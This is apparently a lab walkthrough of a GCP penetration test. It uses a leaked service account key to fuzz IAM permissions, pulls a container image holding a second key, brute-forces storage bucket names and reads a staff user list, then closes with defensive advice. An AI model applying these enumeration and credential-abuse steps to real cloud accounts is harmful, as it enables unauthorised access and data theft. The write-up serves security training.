---
title: Illuminate GCP by Fuzzing IAM Permissions
description: Illuminate GCP by Fuzzing IAM Permissions 
image:
  path: gcp.png
categories:
- Pwned Labs
- GCP
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/gcp/
tags:
- pwnedlabs
- gcp
- cloud
---
# Scenario
Your team is tasked with conducting a penetration test of Gigantic Retail Company. During the assessment, one of the penetration testers successfully identified an accidentally leaked GCP service account key and gained a foothold in the client's cloud environment. Your objective is to explore GCP and expand our access further.

# Walkthrough
We are given zip file containing a service account key file for `devops-re@gr-proj-1.iam.gserviceaccount.com`. Let's authenticate
```
└─$ gcloud auth activate-service-account --key-file=devops-re@gr-proj-1.iam.gserviceaccount.com.json 
Activated service account credentials for: [devops-re@gr-proj-1.iam.gserviceaccount.com]
```
To revoke existing accounts before authenticating.
```
gcloud auth revoke --all
```

First, configure the project setting.
```
└─$ gcloud config set project gr-proj-1
WARNING: [devops-re@gr-proj-1.iam.gserviceaccount.com] does not have permission to access projects instance [gr-proj-1] (or it may not exist): The caller does not have permission. This command is authenticated as devops-re@gr-proj-1.iam.gserviceaccount.com which is the active account specified by the [core/account] property
Are you sure you wish to set property [core/project] to gr-proj-1?

Do you want to continue (Y/n)?  Y

Updated property [core/project].

```

Let's continue enumerating the GCP environment. Start with checking if we have permissions to list IAM permissions bound to the project.
```
└─$ gcloud projects get-iam-policy gr-proj-1 --format=json
ERROR: (gcloud.projects.get-iam-policy) [devops-re@gr-proj-1.iam.gserviceaccount.com] does not have permission to access projects instance [gr-proj-1:getIamPolicy] (or it may not exist): The caller does not have permission. This command is authenticated as devops-re@gr-proj-1.iam.gserviceaccount.com which is the active account specified by the [core/account] property
                      
```

We receive an error indicating that we don't have `getIamPolicy` permission. This is quite common, as not every account is granted the `getIamPolicy` permission.

There is a workaround for this limitation by leveraging a nifty feature in GCP known as `testIamPermissions`. This method allows us to evaluate our existing permissions in GCP effectively. Essentially, it involves sending a request with the name of the resource (project, folder, or service), along with a list of permissions we're interested in. To read more about it at the Google Cloud [documentation](https://cloud.google.com/resource-manager/reference/rest/v1/projects/testIamPermissions).

To assess permissions using `testIamPermissions`, we need to send a POST request. This request should include the project ID, access token, and the specified permissions we want to test.
```
└─$ curl -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/$(gcloud config get-value project):testIamPermissions" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  --data '{
    "permissions": ["resourcemanager.projects.get", "artifactregistry.repositories.get"]
  }'
{
  "permissions": [
    "artifactregistry.repositories.get"
  ]
}
```

The request worked and we see that our compromised account has the `artifactregistry.repositories.get` permission. This can be turned into a simple script.
```
#!/bin/bash

ACCESS_TOKEN="$(gcloud auth print-access-token)"
PROJECT_ID="$(gcloud config get-value project)"
SERVICE_ACCOUNT_EMAIL="$(gcloud auth list --filter=status:ACTIVE --format="value(account)")"

PERMISSIONS=("resourcemanager.projects.get" "artifactregistry.repositories.get" "storage.buckets.get" "compute.instances.list" "iam.serviceAccounts.implicitDelegation")

curl -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:testIamPermissions" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  --data "{
    \"permissions\": $(printf '%s\n' "${PERMISSIONS[@]}" | jq -R . | jq -s .)
  }"
```
```
└─$ ./permission-fuzz.sh                                                             
{
  "permissions": [
    "artifactregistry.repositories.get"
  ]
}
```

We can use [Python tool](https://github.com/hac01/gcp-iam-brute) capable of automatically fuzzing for various permissions in GCP. It parses through a collection (not exactly a wordlist but numerous JSON files) containing different roles and permissions in GCP. The tool systematically lists valid responses, providing a more dynamic and comprehensive approach to IAM permissions enumeration.

```
└─$ python3 main.py --access-token $(gcloud auth print-access-token) --project-id $(gcloud config get-value project) --service-account-email $(gcloud auth list --filter=status:ACTIVE --format="value(account)") 
⠦ Fuzzing...
Role: artifactregistry.serviceAgent.json

{'permissions': ['artifactregistry.repositories.downloadArtifacts', 'artifactregistry.repositories.get', 'artifactregistry.repositories.readViaVirtualRepository']}

<SNIP>
========================================

⠇ Fuzzing...
Ignoring: visionai.retailcatalogViewer.json - Empty permissions                                                                                                                                                                             

⠸ Fuzzing...
Ignoring: cloudasset.otherCloudConfigServiceAgent.json - Empty permissions                                                                                                                                                                  

⠸ Fuzzing...
Role: artifactregistry.writer.json

{'permissions': ['artifactregistry.dockerimages.get', 'artifactregistry.dockerimages.list', 'artifactregistry.files.get', 'artifactregistry.files.list', 'artifactregistry.locations.get', 'artifactregistry.locations.list', 'artifactregistry.mavenartifacts.get', 'artifactregistry.mavenartifacts.list', 'artifactregistry.npmpackages.get', 'artifactregistry.npmpackages.list', 'artifactregistry.packages.get', 'artifactregistry.packages.list', 'artifactregistry.projectsettings.get', 'artifactregistry.pythonpackages.get', 'artifactregistry.pythonpackages.list', 'artifactregistry.repositories.downloadArtifacts', 'artifactregistry.repositories.get', 'artifactregistry.repositories.list', 'artifactregistry.repositories.listEffectiveTags', 'artifactregistry.repositories.listTagBindings', 'artifactregistry.repositories.readViaVirtualRepository', 'artifactregistry.tags.get', 'artifactregistry.tags.list', 'artifactregistry.versions.get', 'artifactregistry.versions.list']}

========================================

```

We have permissions to read or list the content within the GCP Artifact Registry and download its contents. Artifact Registry, in the context of Google Cloud, serves as a versioned repository for software artifacts, including container images, package dependencies, and other build outputs. It operates as a key component in the CI/CD pipeline and offers several technical features:
- `Supported Formats`: Artifact Registry caters to a variety of package formats such as Docker images, Maven packages, npm packages, and more. This versatility ensures compatibility with diverse development stacks and tools.
- `Versioning Mechanism`: One of its critical technical aspects is the ability to version artifacts. This means each change in your codebase generates a new version, allowing traceability and enabling rollback to previous states.
- `Integration Capabilities`: Artifact Registry seamlessly integrates with other Google Cloud services. For instance, it integrates with Cloud Build for continuous integration and with Kubernetes Engine for efficient deployment in a containerized environment.

To enumerate artifact repository run the following commands(`LOCATION` needs to be uppercase:
```
└─$ gcloud artifacts repositories list --project=gr-proj-1 --format="table[box](name, format, mode, LOCATION)"
Listing items under project gr-proj-1, across all locations.

┌─────────────────┬────────┬─────────────────────┬─────────────┐
│    REPOSITORY   │ FORMAT │         MODE        │   LOCATION  │
├─────────────────┼────────┼─────────────────────┼─────────────┤
│ gcf-artifacts   │ DOCKER │ STANDARD_REPOSITORY │ us-central1 │
│ gigantic-retail │ DOCKER │ STANDARD_REPOSITORY │ us-central1 │
└─────────────────┴────────┴─────────────────────┴─────────────┘

```

It returns the repository named `gigantic-retail`. Let's list the contents of the repository.
```
└─$ gcloud artifacts packages list --repository gigantic-retail --location us-central1
Listing items under project gr-proj-1, location us-central1, repository gigantic-retail.

PACKAGE              CREATE_TIME          UPDATE_TIME          ANNOTATIONS
dev-gigantic-retail  2024-02-01T02:48:20  2024-02-01T02:51:34
jenkins-template     2024-01-30T15:13:58  2024-01-30T15:13:58
```

We receive `dev-gigantic-retail` package. Let's explore the available versions for these packages.
```
└─$ gcloud artifacts versions list --repository gigantic-retail --location us-central1 --package dev-gigantic-retail
Listing items under project gr-proj-1, location us-central1, repository gigantic-retail, package dev-gigantic-retail.

VERSION                                                                  DESCRIPTION  CREATE_TIME          UPDATE_TIME          SIZE       ANNOTATIONS
sha256:1ca5e6a5f74e60ecfe657a68f84f8e544267c762d634b4c827a020acda8575bd               2024-02-01T02:48:20  2024-02-01T02:48:20  294153050
sha256:9b5f522c6388f99ce3771db979cc6ec7c7fac9c860896e25fd04164d8ed3545b               2024-02-01T02:51:34  2024-02-01T02:51:34  294150933
              
```
```
└─$ gcloud artifacts versions list --repository gigantic-retail --location us-central1 --package jenkins-template
Listing items under project gr-proj-1, location us-central1, repository gigantic-retail, package jenkins-template.

VERSION                                                                  DESCRIPTION  CREATE_TIME          UPDATE_TIME          SIZE       ANNOTATIONS
sha256:f80ed070d8f5aa014d270475bc9f2ff37d52375ef8df8368c1e46fb394d31c23               2024-01-30T15:13:58  2024-01-30T15:13:58  358542648
```
The package `dev-gigantic-retail` has two versions, while `jenkins-template` has a single version. Having multiple versions are a potential indicator of something interesting being added/removed in a newer version.

Docker containers contain source code and often have secrets such as credentials set as environment variables or included in the code. Before downloading the packages to search for potential secrets we need to set up the local environment. Make sure to install docker: https://docs.docker.com/engine/install/

Next, inspect the Docker configuration file and see if there is an existing `credHelper` for our `gcloud` region.
```
cat ~/.docker/config.json
```
If not, add it with the following command.
```
└─$ gcloud auth configure-docker us-central1-docker.pkg.dev
Adding credentials for: us-central1-docker.pkg.dev
After update, the following will be written to your Docker config file located at [/home/kali/.docker/config.json]:
 {
  "credHelpers": {
    "us-central1-docker.pkg.dev": "gcloud"
  }
}

Do you want to continue (Y/n)?  y

Docker configuration file updated.

```
```
└─$ cat ~/.docker/config.json                              
{
  "credHelpers": {
    "us-central1-docker.pkg.dev": "gcloud"
  }
} 
```

Now pull the `dev-gigantic-retail` package and try finding secrets using [TruffleHog](https://github.com/trufflesecurity/trufflehog).
```
└─$ docker pull us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail@sha256:1ca5e6a5f74e60ecfe657a68f84f8e544267c762d634b4c827a020acda8575bd
us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail@sha256:1ca5e6a5f74e60ecfe657a68f84f8e544267c762d634b4c827a020acda8575bd: Pulling from gr-proj-1/gigantic-retail/dev-gigantic-retail
2f44b7a888fa: Pull complete 
376771e8483c: Pull complete 
4f4fb700ef54: Pull complete 
6a6627aecff0: Pull complete 
152f4888b550: Pull complete 
fd0579f22872: Pull complete 
c681be99a41a: Pull complete 
a1ceb20aa02b: Pull complete 
eca938fa29c1: Pull complete 
9caba83d06f3: Pull complete 
6b8ff65918ec: Pull complete 
1857f2c7e3ad: Pull complete 
Digest: sha256:1ca5e6a5f74e60ecfe657a68f84f8e544267c762d634b4c827a020acda8575bd
Status: Downloaded newer image for us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail@sha256:1ca5e6a5f74e60ecfe657a68f84f8e544267c762d634b4c827a020acda8575bd
us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail@sha256:1ca5e6a5f74e60ecfe657a68f84f8e544267c762d634b4c827a020acda8575bd
                                                                            
```

Now run `TruffleHog`
```
└─$ docker images                                                                                                                                               
REPOSITORY                                                                 TAG                     IMAGE ID       CREATED         SIZE
<SNIP>
us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail   <none>                  b471ea9bc078   19 months ago   1.07GB
<SNIP> 
```
```
└─$ trufflehog docker --image us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2025-09-07T18:45:43+06:00       info-0  trufflehog      running source  {"source_manager_worker_id": "25UK6", "with_units": false, "target_count": 0, "source_manager_units_configurable": true}
2025-09-07T18:45:46+06:00       error   trufflehog      error processing image  {"source_manager_worker_id": "25UK6", "source_type": "SOURCE_TYPE_DOCKER", "source_name": "trufflehog - docker", "image": "us-central1-docker.pkg.dev/gr-proj-1/gigantic-retail/dev-gigantic-retail", "error": "GET https://us-central1-docker.pkg.dev/v2/gr-proj-1/gigantic-retail/dev-gigantic-retail/manifests/latest: MANIFEST_UNKNOWN: Failed to fetch \"latest\""}
2025-09-07T18:45:46+06:00       info-0  trufflehog      finished scanning       {"chunks": 0, "bytes": 0, "verified_secrets": 0, "unverified_secrets": 0, "scan_duration": "3.267623295s", "trufflehog_version": "3.90.6", "verification_caching": {"Hits":0,"Misses":0,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}}
```

It didn't detect any secrets. So let's attempt manual exploration of the container. Spawn a Docker container from the downloaded image by running `docker run <image-id>`.
```
└─$ docker run b471ea9bc078           
AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
[Sun Sep 07 12:47:17.245099 2025] [mpm_event:notice] [pid 1:tid 140507790133120] AH00489: Apache/2.4.58 (Unix) configured -- resuming normal operations
[Sun Sep 07 12:47:17.245267 2025] [core:notice] [pid 1:tid 140507790133120] AH00094: Command line: 'httpd -D FOREGROUND'
```
Confirm that the container is running
```
└─$ docker ps -a                                                                                                                                                
CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS                     PORTS                                                          NAMES
0ff8725c7d06   b471ea9bc078                   "httpd-foreground"       14 seconds ago   Up 13 seconds              80/tcp                                                         musing_wu
```

Run `docker exec -it <container-id> /bin/sh` to get a shell on the container
```
└─$ docker exec -it 0ff8725c7d06 /bin/sh  
# ls -lha
total 48K
drwxr-xr-x 1 www-data www-data 4.0K Jan 31  2024 .
drwxr-xr-x 1 www-data www-data 4.0K Jan 30  2024 ..
drwxr-xr-x 1 www-data www-data 4.0K Jan 31  2024 admin.gigantic-retail.com
drwx------ 1 www-data www-data 4.0K Jan 31  2024 css
drwx------ 1 www-data www-data 4.0K Dec 14  2023 fonts
-rw-rw-r-- 1 www-data www-data  12K Dec 27  2023 index.html
drwx------ 1 www-data www-data 4.0K Dec 14  2023 js
drwxr-xr-x 1 www-data www-data 4.0K Jan 31  2024 login
drwxrwxr-x 1 www-data www-data 4.0K Jan 31  2024 shop

```

We find the credential file `keyfile.json` in `/usr/local/apache2/app`
```
root@0ff8725c7d06:/usr/local/apache2/app# ls -lha
total 16K
drwxr-xr-x 1 root     root     4.0K Jan 31  2024 .
drwxr-xr-x 1 www-data www-data 4.0K Jan 30  2024 ..
-rw-rw-r-- 1 root     root     2.5K Jan 31  2024 keyfile.json
```

We also notice that that the images in `shop/shop.html` are stored in a Google storage bucket
```
root@0ff8725c7d06:/usr/local/apache2/htdocs# cat shop/shop.html 
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<SNIP>
   <script>
        // Sample JSON object representing the products
        const products = [
            {
                id: 1,
                title: 'Hoodie',
                description: 'The Z hoodie',
                img_url: 'https://storage.cloud.google.com/',
                price: '$69.99'
            },
<SNIP>
```

Copy credentials and log in as the service account `frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com`.
```
└─$ gcloud auth activate-service-account --key-file=keyfile.json 
Activated service account credentials for: [frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com]
```

If we try to enumerate the IAM policy, it also returns an error with our new account
```
└─$ gcloud projects get-iam-policy gr-proj-1 --format=json
ERROR: (gcloud.projects.get-iam-policy) [frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com] does not have permission to access projects instance [gr-proj-1:getIamPolicy] (or it may not exist): The caller does not have permission. This command is authenticated as frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com which is the active account specified by the [core/account] property
       
```

Let's run `gcp-iam-brute` again
```
└─$ python3 main.py --access-token $(gcloud auth print-access-token) --project-id $(gcloud config get-value project) --service-account-email $(gcloud auth list --filter=status:ACTIVE --format="value(account)")
⠏ Fuzzing...
Role: securitycenter.securityResponseServiceAgent.json
<SNIP>
⠇ Fuzzing...
Role: contentwarehouse.serviceAgent.json

{'permissions': ['storage.buckets.get', 'storage.objects.get', 'storage.objects.list']}

========================================

```

We have permissions related to Google Cloud Storage buckets: `storage.buckets.get` and `storage.objects.get`. However we lack the `storage.buckets.list` permission required to list of buckets.

To identify valid buckets that we have access to we can use [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute) tool from Rhino Security Labs. It will launch a smart brute-force on likely bucket names. To run this tool, we can either specify a keyword such the the company name, or some other constant that the company uses in the storage bucket naming convention. If we choose a keyword such as `gigantic-retail`, the tool will automatically create permutations e.g. `tmp-gigantic-retail` or `gigantic-retail001`. Wordlist allows us to create our own permutations.
```
└─$ python3 gcpbucketbrute.py --help                        
usage: gcpbucketbrute.py [-h] (--check CHECK | --check-list CHECK_LIST | -k KEYWORD | -w WORDLIST) [-s SUBPROCESSES] [-f SERVICE_ACCOUNT_CREDENTIAL_FILE_PATH] [-u] [-o OUT_FILE]

This script will generate a list of permutations from ./permutations.txt using the keyword passed into the -k/--keyword argument. Then it will attempt to enumerate Google Storage buckets with those names without any authentication. If
a bucket is found to be listable, it will be reported (buckets that allow access to "allUsers"). If a bucket is found but it is not listable, it will use the default "gcloud" CLI credentials to try and list the bucket. If the bucket
is listable with credentials it will be reported (buckets that allow access to "allAuthenticatedUsers"), otherwise it will reported as existing, but unlistable.

options:
  -h, --help            show this help message and exit
  --check CHECK         Check a single bucket name instead of bruteforcing names based on a keyword. May be repeated to check multiple buckets.
  --check-list CHECK_LIST
                        Check a list of buckets in the given file, one per line.
  -k, --keyword KEYWORD
                        The base keyword to use when guessing bucket names. This could be a simple string like "Google" or a URL like "google.com" or anything else. This string is used to generate permutations to search for.
  -w, --wordlist WORDLIST
                        The path to a wordlist file
  -s, --subprocesses SUBPROCESSES
                        The amount of subprocesses to delegate work to for enumeration. Default: 5. This is essentially how many threads you want to run the script with, but it is using subprocesses instead of threads.
  -f, --service-account-credential-file-path SERVICE_ACCOUNT_CREDENTIAL_FILE_PATH
                        The path to the JSON file that contains the private key for a GCP service account. By default, you will be prompted for a user access token, then if you decline to enter one it will prompt you to default to the
                        default system credentials. More information here: https://google-auth.readthedocs.io/en/latest/user-guide.html#service-account-private-key-files and here: https://google-auth.readthedocs.io/en/latest/user-
                        guide.html#user-credentials
  -u, --unauthenticated
                        Force an unauthenticated scan (you will not be prompted for credentials)
  -o, --out-file OUT_FILE
                        The path to a log file to write the scan results to. The file will be created if it does not exist and will append to it if it already exists. By default output will only print to the screen.
                               
```

We can send authenticated requests with the tool using either a token or key file. We'll specify our key file for the new service account. Although bucket names are [publicly visible](https://cloud.google.com/storage/docs/buckets#considerations), we also want to know our level of access to any identified bucket, so we have to be authenticated for that.
```
└─$ python3 gcpbucketbrute.py -k 'gigantic-retail' -f ~/pwnedlabs/gcp/keyfile.json                 

Generated 1216 bucket permutations.


    AUTHENTICATED ACCESS ALLOWED: web-gigantic-retail
        - AUTHENTICATED LISTABLE (storage.objects.list)
        - AUTHENTICATED READABLE (storage.objects.get)
        - ALL PERMISSIONS:
        [
            "storage.buckets.get",
            "storage.objects.get",
            "storage.objects.list"
        ]


    AUTHENTICATED ACCESS ALLOWED: gigantic-retail
        - AUTHENTICATED LISTABLE (storage.objects.list)
        - AUTHENTICATED READABLE (storage.objects.get)
        - ALL PERMISSIONS:
        [
            "storage.buckets.get",
            "storage.objects.get",
            "storage.objects.list"
        ]


Scanned 1216 potential buckets in 3 minute(s) and 9 second(s).

Gracefully exiting!
```

Looks like we have `list` and `get` permissions on the bucket `web-gigantic-retail`. Let's enumerate the bucket
```

└─$ gsutil ls gs://web-gigantic-retail                    
gs://web-gigantic-retail/baggyjeans.jpg
gs://web-gigantic-retail/hoodie.webp
gs://web-gigantic-retail/retail2.jpg
gs://web-gigantic-retail/retail3.jpg
gs://web-gigantic-retail/retail4.jpg
gs://web-gigantic-retail/suit.avif
gs://web-gigantic-retail/admin/
```

We find `admin` directory. Listing it shows an export from the Gigantic Retail Google Workspace, and the flag for the lab
```
└─$ gsutil ls gs://web-gigantic-retail/admin
gs://web-gigantic-retail/admin/
gs://web-gigantic-retail/admin/Google_Workspace_User_Download_05022024_000726.csv
gs://web-gigantic-retail/admin/flag.txt

```
Specify the file destination as `-` with the `cp` command, which displays the the output in the terminal. User list can be used to try and social engineer other Gigantic Retail employees or use it in our OSINT efforts.
```
└─$ gsutil cp gs://web-gigantic-retail/admin/Google_Workspace_User_Download_05022024_000726.csv -
First Name [Required],Last Name [Required],Email Address [Required],Status [READ ONLY],Last Sign In [READ ONLY],Email Usage [READ ONLY],2sv Enrolled [READ ONLY]
gcp,automation,automation@gigantic-retail.com,Active,2023/09/03 20:23:16,0.02GB,True
Mike,Jones,mike@gigantic-retail.com,Active,2024/01/31 07:55:13,0.0GB,False
Nico,Smith,nico@gigantic-retail.com,Active,2024/01/23 12:52:47,0.0GB,False
Prasad,Khan,prasad@gigantic-retail.com,Active,2024/01/30 06:26:31,0.02GB,True
Xi,Li,xi@gigantic-retail.com,Active,2023/12/19 17:12:18,0.0GB,False
<SNIP>
```
# Defense
Based on lab's [Defense](https://pwnedlabs.io/labs/illuminate-gcp-by-fuzzing-iam-permissions) section.

- Containers often need to access to other resources and services in the cloud, such as databases and other containers.
   - As such, they are a very attractive target for threat actors as they often contain credentials that have either been injected in, hardcoded or stored in cleartext.
   - These credentials offer threat actors a likely lateral movement path to other services, and they can also attempt to access the host through a container escape or compromise the registry service by injecting a malicious image.
- Adopt an assume breach mentality, as even if a compromised account doesn't have direct privileges to list IAM policies, there are other ways to reveal IAM permissions and gain situational awareness! 
  - Fuzzing IAM permissions is very noisy and defenders should set up processes to alert on such enumeration.
- It's recommended to append or prefix a unique identifier in addition to the name, that makes deployed buckets more resistant to discovery via brute force.
  - Adopting a standard (predictable) naming convention helps admins and engineers to manage their infrastructure, but they can also help threat actors to gain access to resources. 